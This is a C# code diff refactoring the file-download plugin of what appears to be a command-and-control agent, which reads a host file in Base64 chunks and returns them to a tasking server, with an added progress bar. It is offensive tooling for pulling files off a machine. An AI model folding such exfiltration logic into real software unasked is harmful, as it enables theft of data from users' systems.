@@ -15,7 +15,7 @@ namespace Agent
     {
         public int currentChunk { get; set; }
         public int totalChunks { get; set; }
-        public string file_id { get; set; }
+        public string file_id { get; set; } = string.Empty;
 
         public string ToJson()
         {
@@ -31,12 +31,12 @@ namespace Agent
         private IAgentConfig config { get; set; }
         private ConcurrentDictionary<string, ServerDownloadJob> downloadJobs { get; set; }
         private Dictionary<string, FileStream> _streams { get; set; }
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
+        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
             this.messageManager = messageManager;
             this.logger = logger;
             this.downloadJobs = new ConcurrentDictionary<string, ServerDownloadJob>();
-            this._streams = new Dictionary<string, FileStream>();   
+            this._streams = new Dictionary<string, FileStream>();
             this.tokenManager = tokenManager;
             this.config = config;
         }
@@ -47,12 +47,12 @@ namespace Agent
             string message = string.Empty;
 
             //Validate params
-            if(args is null || !args.Validate(out message))
+            if (args is null || !args.Validate(out message))
             {
-                await messageManager.AddResponse(new DownloadTaskResponse
+                messageManager.AddTaskResponse(new DownloadTaskResponse
                 {
                     status = "error",
-                    process_response = new Dictionary<string, string> { { "message", message } },
+                    user_output = message,
                     completed = true,
                     task_id = job.task.id
                 }.ToJson());
@@ -63,12 +63,12 @@ namespace Agent
             ServerDownloadJob downloadJob = new ServerDownloadJob(job, args.path, this.config.chunk_size);
 
             //Figure out the total number of chunks required
-            downloadJob.total_chunks = await GetTotalChunks(downloadJob);
+            downloadJob.total_chunks = GetTotalChunks(downloadJob);
 
             //Something went wrong
-            if(downloadJob.total_chunks == 0)
+            if (downloadJob.total_chunks == 0)
             {
-                await messageManager.AddResponse(new DownloadTaskResponse
+                messageManager.AddTaskResponse(new DownloadTaskResponse
                 {
                     status = "error",
                     user_output = "Failed calculating number of messages",
@@ -86,7 +86,7 @@ namespace Agent
             }
             catch (Exception e)
             {
-                await messageManager.AddResponse(new DownloadTaskResponse
+                messageManager.AddTaskResponse(new DownloadTaskResponse
                 {
                     status = "error",
                     user_output = e.ToString(),
@@ -101,7 +101,7 @@ namespace Agent
             downloadJobs.GetOrAdd(job.task.id, downloadJob);
 
             //Send the first response, start download process.
-            await messageManager.AddResponse(new DownloadTaskResponse
+            messageManager.AddTaskResponse(new DownloadTaskResponse
             {
                 user_output = new DownloadJsonResponse()
                 {
@@ -126,80 +126,83 @@ namespace Agent
 
         public async Task HandleNextMessage(ServerTaskingResponse response)
         {
-            //Get Tracker job
-            ServerDownloadJob downloadJob = this.GetJob(response.task_id);
+            // Get the associated download job
+            ServerDownloadJob downloadJob = GetJob(response.task_id);
+
+            // Handle cancellation or server error
             if (response.status != "success" || downloadJob.cancellationtokensource.IsCancellationRequested)
             {
-                string message = "Cancelled by user.";
-                if (response.status != "success")
-                {
-                    message = "An error occurred while communicating with the server.";
-                }
-                await this.messageManager.WriteLine(message, response.task_id, true, "error");
-                this.CompleteDownloadJob(response.task_id);
+                string message = response.status != "success"
+                    ? "An error occurred while communicating with the server."
+                    : "Cancelled by user.";
+                messageManager.WriteLine(message, response.task_id, true, "error");
+                CompleteDownloadJob(response.task_id);
                 return;
             }
 
+            // Initialize file ID if not already set
             if (string.IsNullOrEmpty(downloadJob.file_id))
             {
                 downloadJob.file_id = response.file_id;
             }
 
-            //Increment the chunk number
+            // Increment the chunk number
             downloadJob.chunk_num++;
 
-            //Are we finished?
-            bool completed = (downloadJob.chunk_num == downloadJob.total_chunks);
+            // Check if the job is completed
+            bool isCompleted = downloadJob.chunk_num == downloadJob.total_chunks;
 
-            //Prepare download response
-            DownloadTaskResponse dr = new DownloadTaskResponse()
+            // Prepare the download response
+            var downloadResponse = new DownloadTaskResponse
             {
                 task_id = response.task_id,
-                user_output = new DownloadJsonResponse()
+                user_output = new DownloadJsonResponse
                 {
                     currentChunk = downloadJob.chunk_num,
                     totalChunks = downloadJob.total_chunks,
                     file_id = downloadJob.file_id,
                 }.ToJson(),
-
                 download = new DownloadTaskResponseData
                 {
                     is_screenshot = false,
-                    host = "",
+                    host = string.Empty,
                     file_id = downloadJob.file_id,
                     full_path = downloadJob.path,
                     chunk_num = downloadJob.chunk_num,
                 },
-                status = completed ? String.Empty : $"Processed {downloadJob.chunk_num}/{downloadJob.total_chunks}",
-                completed = (downloadJob.chunk_num == downloadJob.total_chunks),
+                //status = isCompleted ? string.Empty : $"Processed {downloadJob.chunk_num}/{downloadJob.total_chunks}",
+                status = isCompleted ? string.Empty : GetStatusBar(downloadJob.chunk_num, downloadJob.total_chunks),
+                completed = isCompleted,
             };
 
-            //Download next chunk or return an error
-            if(this.TryHandleNextChunk(downloadJob, out var chunk))
+            // Handle the next chunk
+            if (TryHandleNextChunk(downloadJob, out var chunk))
             {
-                dr.download.chunk_data = chunk;
+                downloadResponse.download.chunk_data = chunk;
             }
             else
             {
-                dr.user_output = chunk;
-                dr.status = "error";
-                dr.download.chunk_data = String.Empty;
-                dr.completed = true;
+                downloadResponse.user_output = chunk; // This holds the error message
+                downloadResponse.status = "error";
+                downloadResponse.download.chunk_data = string.Empty;
+                downloadResponse.completed = true;
             }
 
-            //return our message
-            await messageManager.AddResponse(dr.ToJson());
+            // Add the response to the message manager
+            messageManager.AddTaskResponse(downloadResponse.ToJson());
 
-            if (dr.completed)
+            // Complete the job if finished
+            if (downloadResponse.completed)
             {
-                this.CompleteDownloadJob(response.task_id);
+                CompleteDownloadJob(response.task_id);
             }
         }
+
         /// <summary>
         /// Return the number of chunks required to download the file
         /// </summary>
         /// <param name="job">Download job that's being tracked</param>
-        private async Task<int> GetTotalChunks(ServerDownloadJob job)
+        private int GetTotalChunks(ServerDownloadJob job)
         {
             try
             {
@@ -219,7 +222,7 @@ namespace Agent
         {
             downloadJobs.Remove(task_id, out _);
 
-            if(_streams.ContainsKey(task_id) && _streams[task_id] is not null)
+            if (_streams.ContainsKey(task_id) && _streams[task_id] is not null)
             {
                 _streams[task_id].Close();
                 _streams[task_id].Dispose();
@@ -233,7 +236,9 @@ namespace Agent
         /// <param name="job">Download job that's being tracked</param>
         public bool TryHandleNextChunk(ServerDownloadJob job, out string chunk)
         {
-            if (!_streams.ContainsKey(job.task.id))
+            chunk = string.Empty;
+
+            if (!_streams.TryGetValue(job.task.id, out var stream))
             {
                 chunk = "No stream available.";
                 return false;
@@ -241,36 +246,44 @@ namespace Agent
 
             try
             {
-                if (job.total_chunks == 1)
-                {
-                    job.complete = true;
-                    chunk = Misc.Base64Encode(File.ReadAllBytes(job.path));
-                    return true;
-                }
-
                 long totalBytesRead = job.chunk_size * (job.chunk_num - 1);
-                byte[] buffer = new byte[job.chunk_size];
+                long remainingBytes = new FileInfo(job.path).Length - totalBytesRead;
 
-                FileInfo fileInfo = new FileInfo(job.path);
-
-                if (fileInfo.Length - totalBytesRead < job.chunk_size)
+                // Determine the buffer size based on remaining bytes.
+                int bufferSize = (int)Math.Min(job.chunk_size, remainingBytes);
+                if (bufferSize <= 0)
                 {
                     job.complete = true;
-                    buffer = new byte[fileInfo.Length - job.bytesRead];
+                    return false;
                 }
 
-                _streams[job.task.id].Seek(job.bytesRead, SeekOrigin.Begin);
-                job.bytesRead += _streams[job.task.id].Read(buffer, 0, buffer.Length);
+                byte[] buffer = new byte[bufferSize];
+
+                // Seek and read from the stream.
+                stream.Seek(job.bytesRead, SeekOrigin.Begin);
+                int bytesRead = stream.Read(buffer, 0, bufferSize);
+                job.bytesRead += bytesRead;
+
+                // Encode the chunk to Base64.
                 chunk = Misc.Base64Encode(buffer);
+
+                // Mark job as complete if all bytes are read.
+                if (job.bytesRead >= new FileInfo(job.path).Length)
+                {
+                    job.complete = true;
+                }
+
                 return true;
             }
             catch (Exception e)
             {
+                // Handle exceptions gracefully.
                 job.complete = true;
-                chunk = e.ToString();
+                chunk = $"Error: {e.Message}";
                 return false;
             }
         }
+
         /// <summary>
         /// Get a download job by ID
         /// </summary>
@@ -278,6 +291,16 @@ namespace Agent
         public ServerDownloadJob GetJob(string task_id)
         {
             return downloadJobs[task_id];
+        }
+        string GetStatusBar(int chunk_num, int total_chunks)
+        {
+            int barWidth = 50; // Width of the status bar in characters
+            double progress = (double)chunk_num / total_chunks;
+            int filledBars = (int)(progress * barWidth);
+            int emptyBars = barWidth - filledBars;
+
+            string bar = new string('#', filledBars) + new string('-', emptyBars);
+            return $"[{bar}] {progress:P0}"; // \r overwrites the current line
         }
     }
 }
